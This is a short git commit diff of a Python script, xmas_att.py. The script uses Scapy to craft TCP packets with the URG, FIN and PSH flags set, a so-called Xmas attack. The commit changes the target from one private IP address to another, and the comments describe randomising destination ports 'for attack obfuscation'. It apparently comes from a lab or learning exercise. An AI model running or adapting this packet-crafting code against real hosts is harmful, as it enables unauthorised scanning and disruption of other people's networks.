7d7f5c842cdce740820b1d58b57cfcc2adbbc5c5
damprazis <75118208+damprazis@users.noreply.github.com>
2020-12-13 18:43:39 +0100

    Update xmas_att.py

--- xmas_att.py
+++ xmas_att.py
@@ -4,12 +4,11 @@ from random import randint
 from scapy.all import IP, TCP, send
 
 # Create the skeleton of our packet
-template = IP(dst="172.16.20.10")/TCP()
+template = IP(dst="192.168.253.234")/TCP()
 # Start lighting up those bits!
 template[TCP].flags = 'UFP'
 
 # Create a list with a large number of packets to send
-
 # Each packet will have a random TCP dest port for attack obfuscation
 xmas = []
 for pktNum in range(0,100):
